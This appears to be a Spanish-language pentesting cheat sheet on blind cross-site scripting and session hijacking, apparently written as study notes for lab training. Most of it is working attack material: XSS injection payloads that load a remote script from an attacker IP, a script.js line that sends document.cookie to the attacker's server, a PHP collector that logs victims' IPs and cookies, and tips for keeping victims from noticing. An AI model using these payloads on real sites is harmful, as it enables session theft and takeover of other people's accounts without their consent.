---
tags:
  - xss
  - webapp
---
## Conceptos Clave (TL;DR)

* El Session Hijacking permite secuestrar la sesion activa de un usuario mediante el robo de sus cookies, logrando acceso autenticado sin requerir credenciales.

* Se apoya en la ejecucion de codigo JavaScript en el navegador de la victima para recolectar y exfiltrar las cookies hacia un servidor controlado por el atacante.

* Un Blind XSS ocurre cuando el payload se ejecuta en una pagina a la que el atacante no tiene acceso directo, como un panel de administracion.

* Al carecer de visibilidad directa, la deteccion y explotacion requieren payloads que realicen peticiones HTTP de vuelta (out-of-band) a la maquina del atacante.


## Herramientas Clave

* **PHP (Built-in Server)**: Utilizado para levantar un servidor web rapido que sirva archivos JavaScript y capture las peticiones entrantes con las cookies exfiltradas.

* **Netcat**: Alternativa de consola para poner un puerto a la escucha y capturar peticiones HTTP basicas.

* **Developer Tools (Navegador)**: Especificamente la pestaña de almacenamiento (Storage) para reemplazar la cookie actual con la robada y efectuar el secuestro de sesion.

  

## Metodología Paso a Paso
  
1. **Preparacion del Listener**: Levantar un servidor local en la maquina atacante para poder recibir peticiones HTTP.

2. **Identificacion del Campo Vulnerable (Descubrimiento)**: Enviar payloads XSS a todos los campos del formulario. El payload debe intentar cargar un script remoto desde la IP del atacante, añadiendo el nombre del campo al final de la URL para identificar facilmente que parametro reflejo el codigo.

3. **Preparacion del Payload de Exfiltracion**: Una vez identificado el campo vulnerable y el payload funcional, escribir un archivo JavaScript (`script.js`) que extraiga `document.cookie` enviando la informacion al servidor del atacante.

4. **Preparacion del Recolector**: Crear un script PHP (`index.php`) en el servidor del atacante diseñado para capturar el parametro de la cookie, parsearlo y guardarlo de forma limpia en un archivo de texto (`cookies.txt`).

5. **Inyeccion Final y Espera**: Enviar el payload XSS definitivo que apunte a `script.js` a traves del campo vulnerable y esperar a que el usuario objetivo (ej. el administrador) interactue con la pagina.

6. **Secuestro de la Sesion**: Leer el archivo de texto generado para obtener el valor de la cookie, inyectarla en el navegador mediante Developer Tools y recargar la pagina para acceder a la cuenta de la victima.

  
## Cheat Sheet de Comandos

### 1. Iniciar Servidor Local de Captura
```bash
# Inicia un servidor web PHP en el puerto 80 para servir payloads y capturar peticiones.

sudo php -S 0.0.0.0:80
```

### 2. Deteccion de Blind XSS (Payloads de prueba)
```html
# Inyectar en diferentes campos cambiando el final de la URL para identificar el origen.

<script src=http://<ATTACKER_IP>/<NOMBRE_DEL_CAMPO></script>


# Variaciones para escapar de atributos HTML si el anterior no funciona.

<script src=http://10.10.15.97:80/script.js></script>

><script src=http://10.10.15.97:80/script.js></script>

"><script src=http://10.10.15.97:80/script.js></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.97:80/script.js\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.97:80/script.js");a.send();</script>

<script>$.getScript("http://10.10.15.97:80/script.js")</script>
```

### 3. Payload JavaScript (script.js)
```javascript
# Crea una imagen invisible que, al intentar cargar su fuente, envia las cookies al atacante.

# Guardar este contenido en un archivo llamado script.js en el directorio del servidor web.

new Image().src='http://<ATTACKER_IP>/index.php?c='+document.cookie
```

### 4. Recolector de Cookies en PHP (index.php)
```php
# Parsea la variable GET 'c', separa multiples cookies y las anexa en cookies.txt.
# Guardar como index.php en el directorio del servidor web atacante.

<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

### 5. Inyeccion Definitiva
```html
# Payload XSS para inyectar en el campo que descubrimos como vulnerable, apuntando a nuestro script malicioso.

<script src=http://<ATTACKER_IP>/script.js></script>
```


## "Gotchas" y Troubleshooting

* **Omision estrategica de campos**: No pierdas tiempo probando el payload en campos con validacion de formato estricta (como el correo electronico) ni en campos de contraseñas, ya que rara vez seran el vector de entrada viable o mostraran texto en claro.

* **Evasion de sospechas**: Para extraer la cookie mediante JavaScript, prefiere utilizar el metodo de `new Image().src` por sobre `document.location`. El metodo de la imagen es silencioso, mientras que cambiar la ubicacion del documento redirigira a la victima, alertandola del ataque.

* **Contexto del DOM**: El exito en Blind XSS suele requerir adivinar como se refleja el input en el backend. Si el inyector basico no funciona, recuerda iterar con cierres de etiquetas y atributos (`'>`, `">`).

* **Inyeccion de Cookie manual**: En Firefox, puedes usar `Shift+F9` para abrir directamente la pestaña de Storage. Añade una nueva cookie asegurandote de separar correctamente el nombre (parte antes del `=`) y el valor (parte despues del `=`).